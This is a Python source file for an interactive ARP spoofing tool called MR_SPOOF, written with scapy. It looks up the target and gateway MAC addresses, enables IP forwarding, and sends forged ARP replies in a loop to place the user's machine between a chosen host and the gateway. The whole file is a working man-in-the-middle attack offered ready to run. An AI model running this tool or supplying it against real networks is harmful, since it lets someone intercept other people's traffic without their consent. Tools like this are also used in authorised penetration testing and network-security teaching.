#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# need: netiface
#                      code by B3RT1NG
#                 https://github.com/b3rt1ng
import uuid, sys, socket, os, subprocess, netifaces, signal, threading
import urllib.request
from scapy.all import *
def get_mac(ip_address):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m' #we define the colors here
usrmac = (':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)for ele in range(0,8*6,8)][::-1])) #store your MAC adress in this variable as a str value
usrip = (([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0] #store yout IP adress in this variable
usrhname = socket.gethostname()
gateways = netifaces.gateways() #find out he default gateway using netiface
gtwip = gateways['default'][netifaces.AF_INET][0]
gtwmac = get_mac(gtwip)
trgip = 'not set yet'
trgmac = 'not set yet'
trgvendor = 'not set yet'
iface = ""
os.system("clear")

def banner():
    """ Create a very cool banner ! """
    spaces = " " * 76
    sys.stdout.write(MAGENTA + spaces + """
      ███▄ ▄███▓ ██▀███    ██████  ██▓███   ▒█████   ▒█████    █████▒
     ▓██▒▀█▀ ██▒▓██ ▒ ██▒▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒
     ▓██    ▓██░▓██ ░▄█ ▒░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░
     ▒██    ▒██ ▒██▀▀█▄    ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░
     ▒██▒   ░██▒░██▓ ▒██▒▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░
     ░ ▒░   ░  ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░
     ░  ░      ░  ░▒ ░ ▒░░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░
     ░      ░     ░░   ░ ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░
     ░      ░           ░               ░ ░      ░ ░
    """ + RED + """                                                    (By b3rt1ng)""" + '\n')
def showusrinf():
    """ Show the users info, require 'usrmac' and 'usrip' to be defined. """
    spaces = " " * 8
    sys.stdout.write(spaces + YELLOW + 'Your IP adress: ')
    sys.stdout.write(WHITE + usrip + '\n')
    sys.stdout.write(spaces + YELLOW + 'Your Hostname: ')
    sys.stdout.write(WHITE + usrhname + '\n')
    sys.stdout.write(spaces + YELLOW + 'Your Interface: ')
    sys.stdout.write(WHITE + iface + '\n')
    sys.stdout.write(spaces + YELLOW + 'Your MAC address: ')
    sys.stdout.write(WHITE + usrmac + '\n')
def targinf():
    """ show the target informations, require 'trgmac' and 'trgip' to be defined. """
    spaces = " " * 8
    sys.stdout.write(spaces + YELLOW + 'Target IP adress: ')
    sys.stdout.write(WHITE + trgip + '\n')
    sys.stdout.write(spaces + YELLOW + 'Target MAC adress: ')
    sys.stdout.write(WHITE + trgmac + '\n')
    sys.stdout.write(spaces + YELLOW + 'Target vendor: ')
    sys.stdout.write(WHITE + trgvendor + '\n')
def gateinf():
    """ show the default gateway informations. """
    spaces = " " * 8
    sys.stdout.write(spaces + YELLOW + 'Gateway IP adress: ')
    sys.stdout.write(WHITE + gtwip + '\n')
    sys.stdout.write(spaces + YELLOW + 'Gateway MAC adress: ')
    sys.stdout.write(WHITE + gtwmac + '\n')
def get_iface():
    global iface
    route = "/proc/net/route"
    with open(route) as f:
        for line in f.readlines():
            try:
                iface, dest, _, flags, _, _, _, _, _, _, _, =  line.strip().split()
                if dest != '00000000' or not int(flags, 16) & 2:
                    continue
                return iface
            except:
                continue
def sepline():
    sys.stdout.write(RED + '----------------------------------------------------------------------' + '\n')
def choice():
    sys.stdout.write(GREEN + '[' + RED + '1' + GREEN + '] '); sys.stdout.write('Target IP' + '\n')
    sys.stdout.write(GREEN + '[' + RED + '2' + GREEN + '] '); sys.stdout.write('Netdiscover ' + '\n')
    sys.stdout.write(GREEN + '[' + RED + '3' + GREEN + '] '); sys.stdout.write('Start spoof' + '\n')
    sys.stdout.write(GREEN + '[' + RED + '4' + GREEN + '] '); sys.stdout.write('Exit' + '\n')
    sys.stdout.write(MAGENTA + 'MR_SPOOF'); sys.stdout.write(BLUE); main_choice = input('> ')
    if main_choice == "1":
        type_target()
    elif main_choice == "2":
        Netdiscover()
    elif main_choice == "3":
        startspoof()
    elif main_choice == "4":
        close()
def startspoof():
    global gtwip, gtwmac, trgip, trgmac
    os.system('clear')
    sys.stdout.write(GREEN + '[' + RED + '+' + GREEN + '] '+'Enabling IP forwarding' + '\n')
    os.system("sysctl -w net.inet.ip.forwarding=1")
    arp_poison(gtwip, gtwmac, trgip, trgmac)
def arp_poison(gtwip, gtwmac, trgip, trgmac):
    sys.stdout.write(GREEN + '[' + RED + '+' + GREEN + '] '+'Started ARP poison attack [CTRL-C to stop]' + '\n')
    try:
        while True:
            send(ARP(op=2, pdst=gtwip, hwdst=gtwmac, psrc=trgip))
            send(ARP(op=2, pdst=trgip, hwdst=trgmac, psrc=gtwip))
            time.sleep(2)
    except KeyboardInterrupt:
        sys.stdout.write(GREEN + '[' + RED + '+' + GREEN + '] '+'Stopped ARP poison attack. Restoring network' + '\n')
        restore_network(gtwip, gtwmac, trgip, trgmac)
def restore_network(gtwip, gtwmac, trgip, trgmac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gtwip, hwsrc=trgmac, psrc=trgip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=trgip, hwsrc=gtwmac, psrc=gtwip), count=5)
    print("[+] Disabling IP forwarding")
    #Disable IP Forwarding on a mac
    os.system("sysctl -w net.inet.ip.forwarding=0")
    #kill process on a mac
    progmount()
def Netdiscover():
    os.system("netdiscover")
    progmount()
def type_target():
    global trgip, trgmac, trgvendor
    os.system('clear')
    tryip = input('your target IP: ')
    sys.stdout.write(GREEN + '[' + RED + '+' + GREEN + '] '); sys.stdout.write('Pining ' + tryip + '\n')
    try:
        subprocess.check_output(["ping", "-c", "1", tryip])
        sys.stdout.write(GREEN + '[' + RED + '+' + GREEN + '] '); sys.stdout.write('Target reachable' + '\n')
    except subprocess.CalledProcessError:
        sys.stdout.write(GREEN + '[' + RED + '-' + GREEN + '] '); sys.stdout.write('Target unreachable' + '\n')
        os.system('clear')
        trgip = 'target unreachable'
        progmount()
    sys.stdout.write(GREEN + '[' + RED + '+' + GREEN + '] '); sys.stdout.write('Setting the IP to target' + '\n')
    trgip = tryip
    sys.stdout.write(GREEN + '[' + RED + '+' + GREEN + '] '); sys.stdout.write('Finding MAC adress' + '\n')
    mac_num = hex(uuid.getnode()).replace('0x', '').upper()
    trgmac = '-'.join(mac_num[i: i + 2] for i in range(0, 11, 2))
    trgmac = get_mac(trgip)
    trgvendor = resolveMac(trgmac)
    progmount()
def close():
    os.system('clear')
    exit()
def resolveMac(mac):
    b_str = urllib.request.urlopen("http://macvendors.co/api/vendorname/"+mac).read()
    b_str = str(b_str, 'utf-8')
    return b_str
def progmount():
    os.system('clear')
    banner()
    showusrinf()
    targinf()
    gateinf()
    sepline()
    choice()
get_iface()
progmount()
